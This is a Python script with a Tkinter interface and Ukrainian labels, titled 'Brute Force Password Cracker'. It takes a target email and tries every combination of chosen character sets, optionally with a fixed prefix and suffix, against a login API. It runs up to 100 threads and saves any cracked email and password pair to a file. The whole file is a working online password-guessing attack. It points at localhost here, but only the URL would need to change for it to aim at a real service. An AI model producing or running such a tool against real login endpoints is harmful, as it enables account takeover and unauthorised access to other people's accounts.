import time
from datetime import datetime
import requests
import itertools
import string
import threading
from concurrent.futures import ThreadPoolExecutor
import tkinter as tk
from tkinter import ttk, messagebox

API_URL = "http://localhost:8080/api/users/login"
OUTPUT_FILE = "found_passwords.txt"

SYSTEM_CHOICES = {
    "eng_uppercase": string.ascii_uppercase,
    "eng_lowercase": string.ascii_lowercase,
    "ua_uppercase": "АБВГДЕЄЖЗИІЙКЛМНОПРСТУФХЦЧШЩЬЮЯ",
    "ua_lowercase": "абвгдеєжзиійклмнопрстуфхцчшщьюя",
    "numbers": string.digits,
    "spec_symbols": string.punctuation
}

print_lock = threading.Lock()
found_password = threading.Event()

def process_passwords(user_email, charset, password_lengths, prefix="", suffix=""):
    if not charset:
        with print_lock:
            print("Invalid character set provided.", flush=True)
        return

    for length in password_lengths:
        total_length = length - (len(prefix) + len(suffix))
        if total_length <= 0:
            with print_lock:
                print("The total password length is smaller than the combined prefix and suffix length.", flush=True)
            return

        # Генерація паролів тільки для необхідної довжини
        for password in itertools.product(charset, repeat=total_length):
            if found_password.is_set():
                return

            password_str = prefix + ''.join(password) + suffix
            response = requests.post(API_URL, json={'email': user_email, 'password': password_str},
                                     headers={'Content-Type': 'application/json'})

            with print_lock:
                print(f"Trying email [{user_email}] with password [{password_str}] at {datetime.now()}", flush=True)

            if response.status_code == 200:
                with print_lock:
                    print("#######################################################################")
                    print(f"Password found: {password_str}", flush=True)
                    print("#######################################################################")
                    with open(OUTPUT_FILE, "a") as f:
                        f.write(f"{user_email},{password_str},{datetime.now()}\n")
                found_password.set()
                return

def run_in_threads(user_email, user_choices, password_lengths, prefix, suffix, combine=False):
    if combine:
        combined_charset = "".join(SYSTEM_CHOICES[choice] for choice in user_choices if choice in SYSTEM_CHOICES)
        process_passwords(user_email, combined_charset, password_lengths, prefix, suffix)
    else:
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = [
                executor.submit(process_passwords, user_email, SYSTEM_CHOICES[choice], password_lengths, prefix, suffix)
                for choice in user_choices if choice in SYSTEM_CHOICES
            ]
            for future in futures:
                future.result()

def start_cracking():
    email = email_entry.get()
    password_length = int(password_length_entry.get())
    precision = precision_var.get()
    selected_options = [var for var, state in checkboxes.items() if state.get()]
    strategy = strategy_var.get()
    prefix = prefix_entry.get()
    suffix = suffix_entry.get()

    if not email or not selected_options:
        messagebox.showerror("Помилка", "Будь ласка, введіть email та виберіть хоча б одну опцію!")
        return

    password_lengths = [password_length] if precision else [password_length - 1, password_length, password_length + 1]

    if strategy == "OR":
        run_in_threads(email, selected_options, password_lengths, prefix, suffix, combine=False)
    elif strategy == "AND":
        run_in_threads(email, selected_options, password_lengths, prefix, suffix, combine=True)

tk_root = tk.Tk()
tk_root.title("Brute Force Password Cracker")

tk.Label(tk_root, text="Email").pack()
email_entry = tk.Entry(tk_root, width=30)
email_entry.pack()

tk.Label(tk_root, text="Довжина пароля").pack()
password_length_entry = tk.Entry(tk_root, width=5)
password_length_entry.pack()

strategy_var = tk.StringVar(value="OR")
tk.Label(tk_root, text="Стратегія перебору").pack()
tk.Radiobutton(tk_root, text="OR (кожен набір окремо)", variable=strategy_var, value="OR").pack()
tk.Radiobutton(tk_root, text="AND (об'єднати символи)", variable=strategy_var, value="AND").pack()

checkboxes = {}
tk.Label(tk_root, text="Виберіть символи").pack()
for option in SYSTEM_CHOICES:
    var = tk.BooleanVar()
    checkboxes[option] = var
    tk.Checkbutton(tk_root, text=option, variable=var).pack(anchor="w")

tk.Label(tk_root, text="Точність").pack()
precision_var = tk.BooleanVar()
tk.Checkbutton(tk_root, text="Перевіряти лише задану довжину", variable=precision_var).pack()

tk.Label(tk_root, text="Префікс пароля").pack()
prefix_entry = tk.Entry(tk_root, width=30)
prefix_entry.pack()

tk.Label(tk_root, text="Суфікс пароля").pack()
suffix_entry = tk.Entry(tk_root, width=30)
suffix_entry.pack()

tk.Button(tk_root, text="Почати", command=start_cracking).pack()

tk_root.mainloop()
